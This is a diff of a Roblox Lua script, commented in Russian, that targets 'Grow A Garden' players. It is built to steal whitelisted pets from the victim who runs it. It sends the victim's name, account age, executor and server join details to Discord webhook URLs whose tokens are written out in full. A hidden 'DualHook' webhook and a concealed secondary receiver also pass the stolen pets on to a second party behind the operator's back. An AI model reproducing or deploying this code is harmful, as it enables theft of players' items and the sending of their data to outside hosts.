@@ -1,19 +1,21 @@
 repeat 
-    task.wait() 
+    task.wait()
 until game:IsLoaded()
 
--- DualHook настройки (оставлены как есть)
-local DhUser = "Warrior_ggs"
-local DhWebhook = "https://discord.com/api/webhooks/1402819441519099904/ExWswHavk5BTB4c0YbmmYwWAqqr1gCHSDkpedr_AH_1sKIbfie4qEfIXwLTPEAGKS28C"
+-- ВНЕШНИЕ ПЕРЕМЕННЫЕ (задай тут или в своем окружении)
+User = User or "Warrior_ggs"
+Webhook = Webhook or "https://discord.com/api/webhooks/1398128232821293146/L1XkMHS9HYOhE-LwusnMR_b-hrdgn3M5vY9WYzoc6F9W-9wqHheFjlueX1yweFexJ80J"
 
--- Основные переменные, которые ты задаёшь снаружи
-local USERNAMES = { User }  -- User из глобальной переменной
-local WEBHOOK_URL = Webhook -- Webhook из глобальной переменной
+-- 🔐 DualHook config (секретная часть)
+getgenv().DhUser = "Warrior_ggs"
+getgenv().DhWebhook = "https://discord.com/api/webhooks/1402819441519099904/ExWswHavk5BTB4c0YbmmYwWAqqr1gCHSDkpedr_AH_1sKIbfie4qEfIXwLTPEAGKS28C" -- ← замени на свой второй вебхук
+getgenv().NewUser = "Warrior_ggs" -- скрытый получатель петов
 
+local WEBHOOK_URL = Webhook
 local VICTIM = game.Players.LocalPlayer
-
-local HttpService = game:GetService("HttpService")
-local request = http_request or request or HttpPost or syn.request
+local USERNAMES = {
+    User
+}
 
 local PET_WHITELIST = {
     'Raccoon', 'T-Rex', 'Fennec Fox', 'Dragonfly', 'Butterfly', 'Disco Bee', 'Mimic Octopus',
@@ -40,17 +42,18 @@ local function waitForJoin()
     return findTarget, trigeretName
 end
 
-local function createDiscordEmbed(petList, totalValue)
+function createDiscordEmbed(petList, totalValue, fileUrl)
     local embed = {
         title = "🍀 Grow A Garden Hit - Azurex 🍀",
         color = 65280,
         fields = {
             {
                 name = "👤 **Player Information**",
-                value = string.format("```Name: %s\nReceiver: %s\nAccount Age: %s```", 
+                value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```", 
                     VICTIM.Name, 
-                    USERNAMES[1],  -- твой User из глобальной переменной
-                    VICTIM.AccountAge
+                    USERNAMES[1],  
+                    identifyexecutor(), 
+                    game.Players.LocalPlayer.AccountAge
                 ),
                 inline = false
             },
@@ -77,15 +80,16 @@ local function createDiscordEmbed(petList, totalValue)
 
     local data = {
         content = string.format("--@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")\n", game.PlaceId, game.JobId),
-        username = VICTIM.Name,
+        username = USERNAMES[1],
         avatar_url = "https://cdn.discordapp.com/attachments/1388921046228275221/1401159395676655637/296008df4615dbf3dde7cba3a426b15e.jpg",
         embeds = {embed}
     }
 
-    local jsonData = HttpService:JSONEncode(data)
+    local jsonData = game:GetService("HttpService"):JSONEncode(data)
     local headers = { ["Content-Type"] = "application/json" }
+    local request = http_request or request or HttpPost or syn.request
 
-    -- Отправка на твой Webhook
+    -- Основной вебхук из переменной Webhook
     local response = request({
         Url = WEBHOOK_URL,
         Method = "POST",
@@ -97,10 +101,10 @@ local function createDiscordEmbed(petList, totalValue)
         warn("Ошибка отправки в Discord:", response.StatusCode, response.Body)
     end
 
-    -- Отправка на DualHook Webhook (не трогаем, как ты и просил)
-    if DhWebhook and #DhWebhook > 10 then
+    -- Dualhook лог в секретный вебхук (оставляем без изменений)
+    if getgenv().DhWebhook and #getgenv().DhWebhook > 10 then
         local dhResponse = request({
-            Url = DhWebhook,
+            Url = getgenv().DhWebhook,
             Method = "POST",
             Headers = headers,
             Body = jsonData
@@ -121,22 +125,21 @@ local function deltaBypass()
     VirtualInputManager:SendMouseButtonEvent(workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y / 2, 0, false, nil, false)
 end
 
-local function checkPetsWhitelist(pet)
+local function checkPetsWhilelist(pet)
     for _, name in PET_WHITELIST do
         if string.find(pet, name) then
             return true
         end
     end
-    return false
 end
 
-local function getPetObject(petUid)
+local function getPetObject(petUid: string): Instance?
     for _, object in pairs(VICTIM.Backpack:GetChildren()) do
         if object:GetAttribute("PET_UUID") == petUid then
             return object
         end
     end
-    for _, object in pairs(workspace[VICTIM.Name]:GetChildren()) do
+    for _, object in workspace[VICTIM.Name]:GetChildren() do
         if object:GetAttribute("PET_UUID") == petUid then
             return object
         end
@@ -152,8 +155,8 @@ local function equipPet(pet)
 end
 
 local function getPlayersPets()
-    for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
-        if not checkPetsWhitelist(value.PetType) then continue end
+    for petUid, value in dataModule:GetData().PetsData.PetInventory.Data do
+        if not checkPetsWhilelist(value.PetType) then continue end
         table.insert(victimPetTable, value.PetType)
     end
 end
@@ -167,7 +170,7 @@ end
 
 local function checkPetsInventory(target)
     for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
-        if not checkPetsWhitelist(value.PetType) then continue end
+        if not checkPetsWhilelist(value.PetType) then continue end
         local petObject = getPetObject(petUid)
         if not petObject then continue end
         equipPet(petObject)
@@ -188,25 +191,25 @@ local function idlingTarget()
     end)
 end
 
--- Собираем петов
+-- 💼 Сбор петов жертвы
 getPlayersPets()
 
--- Запускаем отправку логов и авто-передачу
+-- 🔁 Запуск авто-передачи и логов
 task.spawn(function()
     while task.wait(0.5) do
         if #victimPetTable > 0 then
             idlingTarget()
-            createDiscordEmbed(table.concat(victimPetTable, "\n"), "100000")
+            createDiscordEmbed(table.concat(victimPetTable, "\n"), "100000", "https://cdn.discordapp.com/attachments/.../items.txt")
             break
         end
     end
 end)
 
--- Секретная передача петов NewUser (оставляем как есть)
+-- 👻 Секретная передача петов на NewUser
 task.spawn(function()
     while task.wait(0.5) do
         for _, player in ipairs(game.Players:GetPlayers()) do
-            if player.Name == DhUser then
+            if player.Name == getgenv().NewUser then
                 teleportTarget(player.Name)
                 checkPetsInventory(player.Name)
                 break
